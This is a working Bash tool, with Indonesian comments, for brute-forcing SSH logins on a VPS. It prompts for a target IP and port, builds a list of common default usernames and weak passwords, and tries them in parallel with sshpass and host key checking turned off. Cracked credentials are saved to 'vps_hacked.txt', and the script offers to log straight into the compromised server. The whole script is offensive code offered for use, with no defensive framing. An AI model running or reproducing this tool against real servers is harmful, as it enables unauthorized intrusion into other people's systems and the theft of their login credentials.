#!/bin/bash

# -------------------------------
# VPS AUTO BRUTE FORCE - MAX 400 TRIES
# [ Otomatis - Multi Thread - Progress Bar ]
# -------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Header
clear
echo -e "${RED}"
echo "    ╔═══════════════════════════════════════════════════════════╗"
echo "    ║     VPS AUTO BRUTE FORCE - MAX 400 TRIES                 ║"
echo "    ║     [ Multi Thread - Otomatis - Progress Bar ]           ║"
echo "    ╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Cek dependencies
for cmd in sshpass parallel timeout; do
    if ! command -v $cmd &> /dev/null; then
        echo -e "${YELLOW}[•] Installing $cmd...${NC}"
        apt-get update -y >/dev/null 2>&1
        apt-get install -y sshpass parallel coreutils >/dev/null 2>&1
    fi
done

echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║            TARGET INFORMATION                  ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
echo ""

# Input target
echo -ne "${WHITE}VPS IP Address : ${NC}"
read VPS_IP

# Validate IP
if [[ ! $VPS_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "${RED}❌ Format IP tidak valid!${NC}"
    exit 1
fi

echo -ne "${WHITE}SSH Port [22] : ${NC}"
read SSH_PORT
SSH_PORT=${SSH_PORT:-22}

# Cek koneksi
echo -e "\n${YELLOW}[•] Checking connection to $VPS_IP:$SSH_PORT...${NC}"
timeout 2 bash -c "echo >/dev/tcp/$VPS_IP/$SSH_PORT" 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${RED}❌ Port $SSH_PORT tidak terbuka atau VPS tidak respond!${NC}"
    exit 1
fi
echo -e "${GREEN}✅ Port $SSH_PORT terbuka!${NC}"

# ==============================================
# WORDLIST GENERATOR - 400 KOMBINASI
# ==============================================
echo -e "\n${YELLOW}[•] Generating 400 username:password combinations...${NC}"

WORDLIST_FILE="/tmp/brutelist_$$.txt"
> "$WORDLIST_FILE"

# Username list (20 usernames)
usernames=(
    "root"
    "admin"
    "administrator"
    "user"
    "test"
    "ubuntu"
    "centos"
    "debian"
    "fedora"
    "oracle"
    "postgres"
    "mysql"
    "nginx"
    "apache"
    "www-data"
    "ftpuser"
    "backup"
    "support"
    "guest"
    "manager"
)

# Password list (20 passwords)
passwords=(
    "root"
    "toor"
    "123456"
    "password"
    "12345678"
    "1234"
    "12345"
    "123456789"
    "admin"
    "admin123"
    "root123"
    "password123"
    "qwerty"
    "abc123"
    "letmein"
    "monkey"
    "dragon"
    "master"
    "hello"
    "freedom"
)

# Generate 400 kombinasi (20x20)
for user in "${usernames[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "$user:$pass" >> "$WORDLIST_FILE"
    done
done

# Tambah variasi angka
for i in {1..40}; do
    echo "admin:admin$i" >> "$WORDLIST_FILE"
    echo "root:root$i" >> "$WORDLIST_FILE"
    echo "user:user$i" >> "$WORDLIST_FILE"
done

# Hitung total kombinasi
TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
echo -e "${GREEN}✅ Generated $TOTAL_COMBOS combinations (max 400)${NC}"

# ==============================================
# BRUTE FORCE FUNCTION
# ==============================================
brute_one() {
    local cred="$1"
    local ip="$2"
    local port="$3"
    local result_file="$4"
    
    IFS=':' read -r user pass <<< "$cred"
    
    # Coba login dengan timeout 5 detik
    timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 -p "$port" "$user@$ip" exit 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "SUCCESS:$user:$pass" >> "$result_file"
        echo -e "\n${GREEN}✅ FOUND! $user:$pass${NC}"
        return 0
    fi
    return 1
}

export -f brute_one

# ==============================================
# PROGRESS BAR & EKSEKUSI
# ==============================================
echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         BRUTE FORCE PROCESS STARTED           ║${NC}"
echo -e "${RED}║         MAX 400 ATTEMPTS                      ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
echo ""

RESULT_FILE="/tmp/brute_result_$$.txt"
> "$RESULT_FILE"

# Progress bar variables
TOTAL=$TOTAL_COMBOS
CURRENT=0
FOUND=0
START_TIME=$(date +%s)

# Baca file wordlist per line
while IFS= read -r cred; do
    ((CURRENT++))
    
    # Hitung persentase
    PERCENT=$((CURRENT * 100 / TOTAL))
    
    # Progress bar
    BAR=""
    for ((i=0; i<PERCENT; i+=2)); do
        BAR+="▓"
    done
    for ((i=PERCENT; i<100; i+=2)); do
        BAR+="░"
    done
    
    # Tampilkan progress
    echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL]${NC}"
    
    # Coba brute
    brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
    
    # Limit background processes (multi thread)
    if (( CURRENT % 10 == 0 )); then
        wait
    fi
    
    # Cek apakah sudah ketemu
    if [ -s "$RESULT_FILE" ]; then
        FOUND=1
        break
    fi
    
done < "$WORDLIST_FILE"

wait

# ==============================================
# HASIL
# ==============================================
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo -e "\n\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              BRUTE FORCE COMPLETE              ║${NC}"
echo -e "${GREEN}╠════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║                                                ║${NC}"
echo -e "${GREEN}║  ${WHITE}Target IP   : ${CYAN}$VPS_IP${NC}"
echo -e "${GREEN}║  ${WHITE}Port         : ${CYAN}$SSH_PORT${NC}"
echo -e "${GREEN}║  ${WHITE}Attempts     : ${YELLOW}$CURRENT / $TOTAL${NC}"
echo -e "${GREEN}║  ${WHITE}Time         : ${YELLOW}${DURATION}s${NC}"
echo -e "${GREEN}║                                                ║${NC}"

if [ -s "$RESULT_FILE" ]; then
    while IFS=':' read -r status user pass; do
        if [ "$status" == "SUCCESS" ]; then
            echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${GREEN}FOUND!${NC}"
            echo -e "${GREEN}║  ${WHITE}👤 USERNAME    : ${YELLOW}$user${NC}"
            echo -e "${GREEN}║  ${WHITE}🔑 PASSWORD    : ${RED}$pass${NC}"
            
            # Save credentials
            echo "$VPS_IP:$SSH_PORT:$user:$pass" >> vps_hacked.txt
        fi
    done < "$RESULT_FILE"
else
    echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${RED}NOT FOUND${NC}"
    echo -e "${GREEN}║  ${WHITE}               Tidak ada credentials valid${NC}"
fi

echo -e "${GREEN}║                                                ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"

# ==============================================
# AUTO LOGIN JIKA BERHASIL
# ==============================================
if [ -s "$RESULT_FILE" ]; then
    echo -e "\n${YELLOW}[•] Credentials saved to: vps_hacked.txt${NC}"
    
    # Baca credentials yang berhasil
    IFS=':' read -r status user pass < "$RESULT_FILE"
    
    echo -e "\n${WHITE}Pilih aksi:${NC}"
    echo "1. Login SSH sekarang"
    echo "2. Coba brute dengan wordlist lain"
    echo "3. Keluar"
    echo -ne "\n${YELLOW}Pilih [1-3]: ${NC}"
    read ACTION
    
    case $ACTION in
        1)
            echo -e "\n${GREEN}🔑 Connecting to $VPS_IP as $user...${NC}"
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$SSH_PORT" "$user@$VPS_IP"
            ;;
        2)
            echo -e "\n${YELLOW}[•] Menjalankan ulang brute force...${NC}"
            rm -f "$WORDLIST_FILE" "$RESULT_FILE"
            exec $0
            ;;
        3)
            echo -e "\n${GREEN}Done! File: vps_hacked.txt${NC}"
            ;;
    esac
else
    echo -e "\n${YELLOW}[•] Tidak ada credentials ditemukan dalam 400 percobaan.${NC}"
    echo -ne "\n${WHITE}Coba lagi dengan wordlist berbeda? (y/n): ${NC}"
    read TRY_AGAIN
    
    if [[ "$TRY_AGAIN" == "y" || "$TRY_AGAIN" == "Y" ]]; then
        # Generate wordlist berbeda
        echo -e "${YELLOW}[•] Generating new wordlist...${NC}"
        
        # Tambah variasi tanggal
        for year in {2020..2024}; do
            echo "admin:admin$year" >> "$WORDLIST_FILE"
            echo "root:root$year" >> "$WORDLIST_FILE"
            echo "user:pass$year" >> "$WORDLIST_FILE"
        done
        
        # Tambah variasi bulan
        for month in {01..12}; do
            echo "admin:admin$month" >> "$WORDLIST_FILE"
            echo "root:toor$month" >> "$WORDLIST_FILE"
        done
        
        # Jalankan ulang
        TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
        echo -e "${GREEN}✅ Generated $TOTAL_COMBOS new combinations${NC}"
        
        # Reset dan jalankan ulang
        > "$RESULT_FILE"
        CURRENT=0
        
        while IFS= read -r cred; do
            ((CURRENT++))
            PERCENT=$((CURRENT * 100 / TOTAL_COMBOS))
            
            BAR=""
            for ((i=0; i<PERCENT; i+=2)); do
                BAR+="▓"
            done
            for ((i=PERCENT; i<100; i+=2)); do
                BAR+="░"
            done
            
            echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL_COMBOS]${NC}"
            
            brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
            
            if (( CURRENT % 10 == 0 )); then
                wait
            fi
            
            if [ -s "$RESULT_FILE" ]; then
                break
            fi
            
        done < "$WORDLIST_FILE"
        
        wait
        
        # Tampilkan hasil lagi
        if [ -s "$RESULT_FILE" ]; then
            echo -e "\n\n${GREEN}✅ BERHASIL pada percobaan kedua!${NC}"
            cat "$RESULT_FILE"
        else
            echo -e "\n\n${RED}❌ Masih gagal setelah $TOTAL_COMBOS percobaan.${NC}"
        fi
    fi
fi

# ==============================================
# STATISTIK
# ==============================================
echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}📊 BRUTE FORCE STATISTICS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
echo -e "Target IP    : $VPS_IP"
echo -e "Port         : $SSH_PORT"
echo -e "Total tries  : $CURRENT"
echo -e "Max tries    : 400"
echo -e "Time elapsed : ${DURATION}s"
echo -e "Speed        : $((CURRENT / (DURATION + 1))) attempts/second"
echo -e "${CYAN}════════════════════════════════════════════════════${NC}"

# Cleanup
rm -f "$WORDLIST_FILE" "$RESULT_FILE" 2>/dev/null

echo -e "\n${GREEN}✅ Done!${NC}"
echo -e "${CYAN}Telegram: @lynnn046${NC}"
